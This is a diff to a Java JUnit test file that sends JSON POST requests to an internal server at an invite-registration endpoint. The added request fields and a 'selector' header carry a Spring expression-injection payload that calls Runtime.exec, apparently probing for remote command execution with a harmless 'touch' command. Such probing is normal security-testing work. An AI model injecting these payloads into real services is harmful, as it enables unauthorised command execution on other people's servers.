@@ -40,18 +40,24 @@ public class TestHttp {
     @Test
     public void postSingle() throws Exception {
         String cookieValue = "6bd65ebee5484a4e9d91004aaa6ee843";
-        String action = "http://192.168.3.2/app/not/hidFT.action";
-        String json = "{\"appType\":\"2\",\"hmac\":\"Scunt32Krj0GMf8oT15keLM93F6yMczX0hsNoZFWzCZ+Z0SIb+/pDwYGawyzvM2BokoN9BGFLfqo21u5/1kycAXYDRBG8UnPs62T6DZoyuQwALgzZyiZ8zzY8KNnFPqLjjNv+UG/5oEieg7UCN2SikBmPcLcJ03riHoycOWTzGM=\",\"params\":{\"appVersion\":\"27\",\"appType\":\"2\"},\"currentVersion\":\"27\"}";
+        String action = "http://192.168.3.2/cjqh5/inviteReward/registerInviteWithoutPwd.action";
+        String json = "{\"appTypeT(java.lang.Runtime).getRuntime().exec('touch aaaaaaaa')\":\"2T(java.lang.Runtime).getRuntime().exec('touch aaaaaaaa')\",\"hmac\":\"Scunt32Krj0GMf8oT15keLM93F6yMczX0hsNoZFWzCZ+Z0SIb+/pDwYGawyzvM2BokoN9BGFLfqo21u5/1kycAXYDRBG8UnPs62T6DZoyuQwALgzZyiZ8zzY8KNnFPqLjjNv+UG/5oEieg7UCN2SikBmPcLcJ03riHoycOWTzGM=\",\"params\":{\"appVersion\":\"27\",\"appType\":\"2\"},\"currentVersion\":\"27\"}";
+        json = "{\"loginName\":\"11111111111T(java.lang.Runtime).getRuntime().exec('touch aaaaaaaa')\", \"messageCode\":\"123456\",\"channelCode\":\"1\"}";
         StringEntity paras = new StringEntity(json);;
         paras.setContentEncoding("UTF-8");
-        paras.setContentType("application/json");
+        paras.setContentType("application/json; charset=utf-8");
         
         Map<String, String> headerKVs = new HashMap<>();
-        headerKVs.put("Accept", "application/json, text/javascript, */*; q=0.01");
+//        headerKVs.put("Accept", "application/json, text/javascript, */*; q=0.01");
         headerKVs.put("selector", "T(java.lang.Runtime).getRuntime().exec('touch aaaaaaaa')");
     
         String result = WebRequestClient.testLinkPost(action, "JSESSIONID", cookieValue, paras , headerKVs);
         System.out.println(result);
+    }
+    
+    @Test
+    public void websocketTest() throws Exception {
+        String action = "http://192.168.3.2:8080/topic/greetings";
     }
     
     @Test
